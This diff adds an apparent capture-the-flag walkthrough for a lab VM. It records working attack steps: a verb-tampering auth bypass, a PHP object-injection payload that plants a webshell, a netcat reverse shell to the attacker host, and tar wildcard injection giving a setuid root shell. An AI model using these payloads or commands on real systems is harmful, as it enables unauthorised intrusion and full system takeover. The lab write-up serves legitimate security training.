@@ -1,0 +1,221 @@
+# attacker localhost = 192.168.56.1
+
+
+# discover live hosts
+$ nmap -sP 192.168.56.0/24
+
+192.168.56.101
+
+# port scan
+$ nmap -sV 192.168.56.101
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-03 17:30 EST Nmap scan
+report for 192.168.56.101 Host is up (0.0046s latency). Not shown: 997
+closed ports PORT    STATE SERVICE VERSION 22/tcp  open  ssh     OpenSSH
+6.7p1 Debian 5 (protocol 2.0) 80/tcp  open  http    Apache httpd 111/tcp
+open  rpcbind 2-4 (RPC #100000) Service Info: OS: Linux; CPE:
+cpe:/o:linux:linux_kernel
+
+browser to port 80 login prompt
+
+burp to port 80 get returns 401 HEAD ok TRACE unallowed 405 POST 401 PUT
+401 OPTIONS 401 DELETE 401
+
+intercept request for index.php with burp change verb to not GET, use
+anything
+
+view source of returned webpage discover /scriptz/ browse to /scriptz/
+log.php.bak php.js
+
+on index.php, click the link, intercept with burp. view the single
+parameter,
+
+O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:
+"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}
+
+test by replacing with a string like this
+
+O:3:"Log":2:{s:8:"filename";s:28:"/var/www/html/scriptz/me.txt";s:4:"
+data";s:11:"howdy%20rowdy";}
+# this writes a single text file to scriptz/ called me.txt
+# 
+which you can then browse to, betcha php webshells work.
+
+O:3:"Log":2:{s:8:"filename";s:29:"/var/www/html/scriptz/me5.php";s:4:"
+data";s:41:"<?php%20$cmd%3d$_GET['cmd'];%20system($cmd);%20?>";}
+
+# yup. repeater that 
+# 
+use with this: 192.168.56.101/scriptz/me5.php?cmd=pwd
+
+run netcat to listen on attacker $ nc -lvnp 8888
+
+connect from Pipe 192.168.56.101/scriptz/me5.php?cmd=nc 192.168.56.1
+8888 -e /bin/bash
+
+
+# with above you are connected as www-data
+# privesc
+
+cat /scriptz/.htaccess
+nothing
+cd ../
+cat .htaccess
+AuthUserFile /var/www/html/.htpasswd
+AuthName "index.php"
+AuthType Basic
+<Limit GET PUT HEAD OPTIONS DELETE>
+require valid-user
+</Limit>
+cat .htpasswd
+rene:$apr1$wfYjXf4U$0ZZ.qhGGrtkOxvKr5WFqX/
+
+# bingo. another user
+ls -la /home/rene
+total 24
+drwxr-xr-x 3 rene rene 4096 Jul  6  2015 .
+drwxr-xr-x 3 root root 4096 Jul  5  2015 ..
+-rw-r--r-- 1 rene rene  220 Jul  5  2015 .bash_logout
+-rw-r--r-- 1 rene rene 3515 Jul  5  2015 .bashrc
+-rw-r--r-- 1 rene rene  675 Jul  5  2015 .profile
+drwxrwxrwx 2 rene rene 4096 Feb 11 07:01 backup
+
+ls -la /home/rene/backup
+total 104
+drwxrwxrwx 2 rene rene  4096 Feb 11 07:03 .
+drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
+-rw-r--r-- 1 rene rene 64477 Feb 11 07:00 backup.tar.gz
+-rw-r--r-- 1 rene rene 15757 Feb 11 07:02 sys-13457.BAK
+-rw-r--r-- 1 rene rene 11472 Feb 11 07:01 sys-2789.BAK
+-rw-r--r-- 1 rene rene   539 Feb 11 07:03 sys-3978.BAK
+
+# contents of /backup changes over time. 
+
+ls -la /home/rene/backup
+total 80
+drwxrwxrwx 2 rene rene  4096 Feb 11 07:06 .
+drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
+-rw-r--r-- 1 rene rene 61513 Feb 11 07:05 backup.tar.gz
+-rw-r--r-- 1 rene rene  6952 Feb 11 07:06 sys-2493.BAK
+
+# cron runs scheduled tasks on linux
+
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root /root/create_backup.sh
+*/5 * * * * root /usr/bin/compress.sh
+
+# wtf compress.sh? 
+
+cat /usr/bin/compress.sh
+#!/bin/sh
+
+rm -f /home/rene/backup/backup.tar.gz
+cd /home/rene/backup
+tar cfz /home/rene/backup/backup.tar.gz *
+chown rene:rene /home/rene/backup/backup.tar.gz
+rm -f /home/rene/backup/*.BAK
+
+# apparently(cheatsheets) tar command is vulnerable. lets test. 
+# check yo'self
+
+pwd 
+/var/www/html/scriptz
+cd /home/rene/backup
+pwd
+/home/rene/backup
+
+# copy the hard work of someone with more experience than i
+
+echo > --checkpoint=1;
+echo > --checkpoint-action=exec=sh\ shell.sh;
+echo 'chmod u+s /bin/dash' > shell.sh
+chmod +x shell.sh
+ls -la
+total 164
+-rw-r--r-- 1 www-data www-data     1 Feb 11 07:12 --checkpoint-action=exec=sh shell.sh
+-rw-r--r-- 1 www-data www-data     1 Feb 11 07:12 --checkpoint=1
+drwxrwxrwx 2 rene     rene      4096 Feb 11 07:13 .
+drwxr-xr-x 3 rene     rene      4096 Jul  6  2015 ..
+-rw-r--r-- 1 rene     rene     90755 Feb 11 07:10 backup.tar.gz
+-rwxr-xr-x 1 www-data www-data    20 Feb 11 07:13 shell.sh
+-rw-r--r-- 1 rene     rene     25883 Feb 11 07:12 sys-2531.BAK
+-rw-r--r-- 1 rene     rene       465 Feb 11 07:13 sys-26349.BAK
+-rw-r--r-- 1 rene     rene     20350 Feb 11 07:11 sys-8054.BAK
+
+# wait a minute
+
+/bin/dash
+whoami
+root
+
+# OSHIT
+
+cd /root
+ls
+create_backup.sh
+flag.txt
+cat flag.txt
+                                                   .aMMMMMMMMn.  ,aMMMMn.
+                                                                 .aMccccccccc*YMMn.    `Mb
+                                                                aMccccccccccccccc*Mn    MP
+                                                               .AMMMMn.   MM `*YMMY*ccaM*
+                                                              dM*  *YMMb  YP        `cMY
+                                                              YM.  .dMMP   aMn.     .cMP
+                                                               *YMMn.     aMMMMMMMMMMMY'
+                                                                .'YMMb.           ccMP
+                                                             .dMcccccc*Mc....cMb.cMP'
+                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
+                                                          dY*'  '*M;ccccMM..dMMM..MP*cc*Mb
+                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
+                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
+                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
+                                                          Yb;cc;dMMMMMMMMMMMP*'  *YMMP*
+                                                           *YMMMPYMMMMMMP*'          curchack
+                                                       +####################################+
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       |======                            | |
+                                                       +----------------------------------+-+
+                                                        ####################################
+                                                             |======                  |
+                                                             |======                  |
+                                                             |=====                   |
+                                                             |====                    |
+                                                             |                        |
+                                                             +                        +
+
+ .d8888b.                 d8b          d8b               888                                                                    d8b
+d88P  Y88b                Y8P          88P               888                                                                    Y8P
+888    888                             8P                888
+888        .d88b.  .d8888b888   88888b."  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
+888       d8P  Y8bd88P"   888   888 "88b d8P  Y8b88K     888      888 "88b    "88b88K        888  888888 "88bd8P  Y8b   888 "88b888888 "88bd8P  Y8b
+888    88888888888888     888   888  888 88888888"Y8888b.888      888  888.d888888"Y8888b.   888  888888  88888888888   888  888888888  88888888888
+Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
+ "Y8888P"  "Y8888  "Y8888P888   888  888  "Y8888  88888P' "Y888   88888P" "Y888888 88888P'    "Y88888888  888 "Y8888    88888P" 88888888P"  "Y8888Y8P
+                                                                  888                                                   888        888
+                                                                  888                                                   888        888
+                                                                  888                                                   888        888
+Well Done!
+Here's your flag: 0089cd4f9ae79402cdd4e7b8931892b7
+
+
+# lights off on your way out
+
+shutdown -h now
